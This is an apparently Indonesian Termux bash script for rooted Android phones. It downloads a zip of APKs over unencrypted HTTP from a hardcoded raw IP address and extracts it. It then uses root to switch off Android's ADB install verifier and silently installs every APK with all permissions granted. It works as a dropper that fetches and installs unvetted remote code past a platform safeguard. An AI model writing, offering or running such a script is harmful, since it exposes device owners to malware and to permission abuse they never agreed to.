#!/data/data/com.termux/files/usr/bin/bash

# =============================================
# DIRECT HTTP INSTALLER (SDCARD / INTERNAL STORAGE VER)
# VERSION: ZIP EDITION (INSTALL ALL APKS) - ROOT BYPASS ED.
# =============================================

# Konfigurasi Baru (Direct Link)
TARGET_URL="http://43.134.116.2:5555/uploaded/duhek.zip"
STORAGE_DIR="/sdcard/Download/APKHasil" 
ZIP_FILE="duhek.zip"

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# =============================================
# 1. CEK IZIN PENYIMPANAN
# =============================================
setup_storage() {
    echo -e "${BLUE}[INFO]${NC} Memeriksa akses penyimpanan..."
    
    if ls /sdcard >/dev/null 2>&1; then
        echo -e "${GREEN}[OK]${NC} Akses penyimpanan diizinkan."
    else
        echo -e "${RED}[!]${NC} Termux belum punya izin akses memori!"
        termux-setup-storage
        sleep 5
        echo -e "${YELLOW}Tekan Enter jika sudah mengizinkan...${NC}"
        read temp
    fi
    
    if [[ ! -d "$STORAGE_DIR" ]]; then
        mkdir -p "$STORAGE_DIR"
        echo -e "${GREEN}[OK]${NC} Folder dibuat: $STORAGE_DIR"
    fi
}

check_deps() {
    local deps=("curl" "unzip" "tsu")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            echo -e "${BLUE}[INFO]${NC} Menginstall $dep..."
            pkg install -y "$dep" >/dev/null 2>&1
        fi
    done
}

# =============================================
# 2. PROSES UTAMA
# =============================================
run_system() {
    clear
    echo -e "${BLUE}================================${NC}"
    echo -e "${GREEN}DIRECT INSTALLER - ALL APKS EDITION${NC}"
    echo -e "${BLUE}================================${NC}\n"
    
    check_deps
    setup_storage
    
    cd "$STORAGE_DIR" || exit
    
    # Bersihkan file lama
    rm -f *.zip *.apk
    
    # --- Download Langsung ---
    echo -e "${BLUE}[INFO]${NC} Mendownload file dari server..."
    echo -e "${YELLOW}URL: $TARGET_URL${NC}"
    
    curl -L "$TARGET_URL" --progress-bar -o "$ZIP_FILE"
        
    if [[ ! -f "$ZIP_FILE" || ! -s "$ZIP_FILE" ]]; then
        echo -e "${RED}[FAIL]${NC} Download Gagal atau file kosong."
        exit 1
    fi
    
    # --- Extract ZIP ---
    echo -e "${BLUE}[INFO]${NC} Mengekstrak file ZIP..."
    if unzip -o "$ZIP_FILE" -d ./ >/dev/null 2>&1; then
        echo -e "${GREEN}[OK]${NC} Ekstraksi berhasil."
    else
        echo -e "${RED}[FAIL]${NC} Gagal ekstrak. File mungkin bukan ZIP atau corrupt."
        exit 1
    fi
    
    # --- Cari semua APK ---
    local apks=($(ls *.apk 2>/dev/null | sort -V))
    local total_apks=${#apks[@]}
    
    if [[ $total_apks -eq 0 ]]; then
        echo -e "${RED}[FAIL]${NC} Tidak ada APK ditemukan di dalam ZIP."
        exit 1
    fi
    
    echo -e "${GREEN}[OK]${NC} Ditemukan ${total_apks} APK.\n"
    
    # --- Install via Root ---
    if ! command -v su &>/dev/null; then
        echo -e "${RED}[FAIL]${NC} HP TIDAK ROOT. Tidak bisa install otomatis."
        exit 0
    fi
    
    echo -e "${YELLOW}[!] Memulai instalasi senyap...${NC}"
    
    # Bypass Verifier
    su -c "settings put global verifier_verify_adb_installs 0" >/dev/null 2>&1
    
    local success=0
    local failed=0
    
    for apk in "${apks[@]}"; do
        echo -n "📦 Installing $apk... "
        if su -c "pm install -r -t -g \"$STORAGE_DIR/$apk\"" >/dev/null 2>&1; then
            echo -e "${GREEN}✓ OK${NC}"
            ((success++))
        else
            echo -e "${RED}✗ GAGAL${NC}"
            ((failed++))
        fi
    done
    
    echo "----------------------------------------"
    echo -e "${GREEN}✅ Selesai! Berhasil: $success, Gagal: $failed${NC}"
    echo -e "${BLUE}[INFO]${NC} File ada di: ${YELLOW}$STORAGE_DIR${NC}"
}

run_system
